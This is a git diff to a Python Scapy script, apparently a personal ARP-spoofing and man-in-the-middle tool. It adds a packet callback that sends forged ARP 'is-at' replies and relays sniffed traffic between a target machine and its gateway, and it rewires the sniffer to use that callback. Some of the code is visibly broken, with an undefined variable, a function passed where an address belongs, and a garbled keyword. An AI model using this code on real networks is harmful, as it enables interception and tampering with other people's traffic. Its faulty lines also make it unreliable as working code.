@@ -48,6 +48,40 @@ def arp_scan(target_ip = '192.168.0.0/24'):
 
 def smart_sniff(target_ip, gateway_ip):
 
+    def hack_the_arp(pkg):
+        pkg.show()
+        if ARP in pkg:        
+                if pkg[ARP].op == 'is-at':
+                    if pkg[ARP].psrc == gateway_ip:
+                        send(ARP(op='is-at', psrc=getmacbyip, pdst=target_ip, hwdst=getmacbyip(targetip)))
+                    elif pkg[ARP].psrc == target_ip:
+                        send(ARP(op='is-at', psrc=target_ip, pdst=gateway_ip, hwdst=getmacbyip(gateway_ip)))
+
+                # if pkg[ARP].op == 'who-has':
+                #     if pkg[ARP].psrc == gateway_ip:
+                #         send(ARP(op='is-at', psrc=target_ip, pdst=pkg[ARP].psrc, hwdst=))
+
+                #     elif pkg[ARP].psrc == target_ip:
+                #         send(ARP(op='is-at', psrc=gateway_ip, pdst=target_ip, hwdst=getmacbyip(hwdst))) 
+
+        # UDP,TCP... packets
+        elif IPv6 in pkg:
+            if pkg[Ether].src == getmacbyip(target_ip):
+                pkg[Ether].dst = getmacbyip(gateway_ip)
+                send(pkg)
+            
+            elif pkg[Ether].src == getmacbyip(gateway_ip):
+                pkg[Ether].dst = getmacbyip(target_ip)
+                send(pkg)
+        else:
+            if pkg[IP].src == target_ip:
+                pkg.dst = getmacbyip(gateway_ip)
+                send(pkg)
+            
+            elif pkg[IP].src == gateway_ip:
+                pkg.dst = getmacbyip(target_ip)
+                send(pkg)
+
     target = False
     gateway = False
     
@@ -57,7 +91,7 @@ def smart_sniff(target_ip, gateway_ip):
     t.start()
     
     time.sleep(3)
-    sniff(prn=lambda x : x.show(), count=5) 
+    sniff(prn=hack_the_arp, lfilter = lambda x: x.src == getmacbyip(target_ip) or x.src == getmacbyip(gateway_ip)) 
     print("on est la tu connais")
 
 def soft_spoof(target_ip, gateway_ip, bool):
@@ -84,11 +118,8 @@ def sniffing(src, dst):
         except:
             send(ARP(ogateway_ipp = 2, psrc = dst, hwsrc = getmacbyip(dst), pdst = src, hwdst = getmacbyip(src)))
 
-
-
-    
     sniff(prn=editPkg, filter="src " + src, stop_filter = lambda x: not getattr(threading.currentThread(), "do_run", True) )
-    
+        
 
 # Craft an ARP packet design to spoof
 def craft_arp_spoof(target_ip, gateway_ip):
